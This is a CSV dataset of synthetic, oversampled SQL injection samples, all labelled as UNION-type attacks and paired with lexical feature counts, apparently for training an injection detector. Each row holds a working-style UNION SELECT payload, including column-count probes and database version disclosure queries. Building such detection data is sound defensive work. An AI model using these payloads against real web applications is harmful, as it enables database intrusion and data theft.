id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000249,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000128,0.9498596891617885,72.65714121409756,21.405715271541464,3.5994354245866282,14.0,42.12571297127805,4.0,12.531428242819512,0.19291429009573985,0.5795265256048687,0.05511836859878283,0.1724408157006086,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,8.531428242819512,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000250,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000200,0.21471978447140022,69.91343997681581,24.0,4.018265878944888,27.0,23.930751981452644,11.0,7.982687995363161,0.3913732345024386,0.3361502405897024,0.1594483547972898,0.1130281701105692,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,3.9826879953631615,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000251,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000069,0.4944922174514255,83.87777924031036,27.749205931339898,3.9146806496880084,40.2507940686601,4.125397034330053,26.501588137320205,13.0,0.48001402116283454,0.04911604242143941,0.31577102478574404,0.155098911629982,3.0,0.0,2.0,0.0,1.0,1.1253970343300512,0.0,2.0,0.0,0.0,1.0,5.874602965669949,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.12539703433005112,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.125397034330051
SMOTE_000252,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000275,0.6299656799808474,66.03618614370487,24.007237228740973,4.123524642424289,27.0,20.028948914963895,11.0,8.007237228740975,0.4112267314984919,0.300435674327758,0.16753681653642263,0.12080077763732748,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,3.0072372287409737,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000253,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000045,0.35156144172475234,74.73800029194507,32.0,4.3922730753913495,44.0,2.0,17.0,11.738000291945072,0.5887722350966971,0.02676237432257711,0.2274801817419057,0.15698520883882,0.0,0.0,2.0,0.0,1.8690001459725358,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.738000291945072,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000254,attack,union," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000007,0.15726625394719773,96.53454231070435,25.178180770234786,4.0078107764476645,62.0,4.1781807702347855,23.17818077023479,7.178180770234787,0.6423462096734354,0.043241496706620586,0.2400895287033185,0.07432276491662554,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.178180770234787,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000255,attack,union,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000199,0.06173779900599017,109.56509378417807,28.086981243164384,4.045207541444337,68.65207502734246,9.0,17.0,14.913018756835614,0.6265215256272167,0.08217401417658157,0.155217582333543,0.13608687786265877,3.0,0.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,6.913018756835615,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000256,attack,union,-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,nearest_attack_euclidean,R000260,0.3392429460858422,81.92341201583667,27.769364806334668,4.250616551567705,37.0,17.538729612669336,17.0,10.384682403167334,0.45203437579618283,0.21357702599414122,0.20769146996040833,0.12669712824926765,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.3846824031673344,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000257,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000019,1.386818478400824,73.81268368289892,31.593658158550543,4.354689537849886,44.812683682898914,2.0,17.0,10.0,0.6070443519276837,0.027100389522228707,0.23035331093894398,0.13550194761114354,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.4063418414494572,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.406341841449457
SMOTE_000258,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000286,0.5235352112313939,89.87588661308679,21.624822677382642,3.5626457017823148,14.0,44.0,15.500709290469436,16.375177322617358,0.15588191439599033,0.4899145881016839,0.17201857343329607,0.1821849240690297,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.3751773226173585,1.0,0.0,9.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000259,attack,union,"-2153'||  (  select 'sofs' where 4126  =  4126 union all select 4126,4126,4126,4126,4126#",nearest_attack_euclidean,R000225,0.18224323564863565,87.76206379559517,28.247587240880968,4.240285229519801,29.0,31.009651036476136,15.0,12.752412759119034,0.33129367596837844,0.3521823414496402,0.17135879791467848,0.14516518466730288,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,3.7524127591190335,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000260,attack,union,"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",nearest_attack_euclidean,R000290,0.08636619007774972,63.56467793866212,22.887064412267577,3.874806711329555,14.0,20.4517423509297,18.0,11.112935587732425,0.2203768694814963,0.3214673691258937,0.2833416893333524,0.17481407205925756,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,3.0,1.0,0.0,3.1129355877324247,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000261,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000275,0.5561201630414528,63.881798333239004,24.1527193332956,4.163338987562767,27.0,18.3054386665912,11.0,7.576359666647801,0.42329643442686216,0.2857732203999601,0.17245410291464752,0.11847624225853026,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,2.5763596666478006,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000262,attack,union,"-7815' union all select 2638,2638,2638,2638,2638--",nearest_attack_euclidean,R000252,0.0017274047060150438,50.01046680036641,20.99790663992672,4.046662040356398,14.0,24.008373440293123,4.0,8.002093360073282,0.27994671447086195,0.4800608977475863,0.0799847755631034,0.1600076122184483,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,4.002093360073282,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000263,attack,union,"-4136'   )    )    as cczp where 7052  =  7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",nearest_attack_euclidean,R000158,1.2089935514774928,104.46365125520416,29.52318256276021,4.020169158577171,25.0,44.37092100416332,22.0,13.092730251040832,0.24154616635124077,0.4212556111612545,0.21256062638909187,0.12463759609841288,1.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,7.092730251040832,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000264,attack,union,"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#",nearest_attack_euclidean,R000082,0.48747579357244525,88.50253115900996,26.419696260918805,4.054538203707732,25.0,37.20202492720797,16.0,10.300506231801993,0.28592419224931065,0.41571788561692646,0.1829914830395588,0.11536643909420405,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,5.300506231801993,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000265,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000116,0.7139021495966285,105.31151162818344,26.82787790704586,3.808729830585301,25.0,46.43717054272781,19.65575581409172,14.218585271363906,0.23814584501812744,0.4412927830748844,0.18564748457607178,0.13491388733091633,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.6092926356819537,0.0,0.0,7.609292635681953,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000266,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.004727287064420778,75.99050189954038,33.0,4.439835928022903,42.0,3.0,17.0,13.990501899540376,0.5527015649507552,0.03947868321076825,0.22371253819435327,0.18410721364412339,3.0,0.0,2.0,0.0,1.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000267,attack,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000033,0.009812398857467508,81.9889771422827,32.98897714228271,4.292822854187877,42.0,4.0,22.0,13.988977142282703,0.5122648238518709,0.04878712608113056,0.2683291934462181,0.17061885662078047,3.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.988977142282703,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000268,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000052,1.1217584557776594,74.0461911908199,31.476904404590055,4.366427339556903,44.0,2.0,17.0,11.046191190819894,0.5943319794710364,0.027015089975956197,0.2296282647956277,0.1490246657573796,0.0,0.0,2.0,0.0,1.5230955954099465,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.0461911908198935,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000269,attack,union,"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",nearest_attack_euclidean,R000109,0.058231282826284377,102.71554272047074,29.82932563228244,4.1016140068022615,25.0,47.77243417637659,16.0,13.943108544094146,0.2434229673061454,0.46504999698674393,0.15579069907593304,0.13573633663117762,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,7.943108544094146,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000270,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000256,0.9220222946158533,107.57974287231501,25.563514286606765,3.7447614680808003,25.0,48.50811429285412,19.38108571964059,14.690542859820296,0.23385150205786379,0.45077963747274563,0.17906570670521188,0.1363031537641787,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.563514286606765,0.0,0.0,8.12702857321353,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000271,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000276,0.3478076291525793,93.3846674332261,28.476933486645223,4.037430739964521,29.0,37.90773394658088,15.0,11.47693348664522,0.31115707153045835,0.405152405782039,0.16094331286058192,0.12274720982692068,1.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,5.47693348664522,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000272,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000190,0.37580796186371024,100.03523732968026,29.178543372334133,3.9379435443901003,25.0,45.42834697867306,17.071260234004797,12.535630117002398,0.25086987400596794,0.45406033771254795,0.1699537389603528,0.12511604932113127,1.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.178543372334133,0.0,0.0,7.3570867446682655,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000273,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000060,1.589421147181338,73.915491285537,31.4577456427685,4.358665437664124,44.0,2.457745642768497,17.0,10.4577456427685,0.5953823531390634,0.03316610947050708,0.2300340909855472,0.14141744640488227,0.0,0.0,2.0,0.0,1.5422543572315,1.0,0.0,1.1102230246251565e-16,0.4577456427685,0.0,1.0,5.4577456427685,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000274,attack,union,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",nearest_attack_euclidean,R000193,0.2543591521330024,73.46185513084657,20.0,3.6570865215880786,14.0,42.76948410467726,4.0,12.692371026169315,0.19076838631774246,0.5819789870654372,0.054505253233640694,0.17274737338317966,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,8.692371026169315,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000275,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R000091,0.12695990711191138,97.98693906878381,27.93420406208108,4.145216943201899,29.0,40.78955125502705,15.0,13.197387813756762,0.2963345698642553,0.4157869025208276,0.15327650165392515,0.13460202596099194,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,6.197387813756761,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000276,attack,union,"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",nearest_attack_euclidean,R000098,0.060070692272135,101.80638285375514,25.883829712253082,3.95225058378126,25.0,47.84510628300411,16.0,12.961276570751027,0.2455872679054095,0.46993071193512964,0.15717585145946208,0.12730616869999878,0.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,7.961276570751028,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000277,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000141,1.4738033801435049,48.60666996840355,22.0,4.128626340511722,14.0,22.60666996840355,4.0,8.0,0.288481139322761,0.464249312686301,0.082423182663646,0.164846365327292,1.0,0.0,1.6966650157982244,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,3.651667492100888,1.696665015798224,1.0,0.0,0.3483325078991121,0.6516674921008879,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000278,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000170,0.08526601464495741,56.15792710594956,21.031585421189913,4.017522525925906,14.0,28.0,4.126341684759648,10.031585421189913,0.2493527577625018,0.4987055155250036,0.07331482023499476,0.17862690647749985,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,0.03158542118991259,1.0,0.0,5.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.03158542118991248,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000279,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000022,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000280,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000176,0.019201575631531714,62.14372984539503,19.0,3.639380593793895,43.114983876316025,1.0,11.0,7.028745969079006,0.6937470919521591,0.016098925461794034,0.17708818007973495,0.11306580250631193,1.0,0.0,2.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,3.028745969079006,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
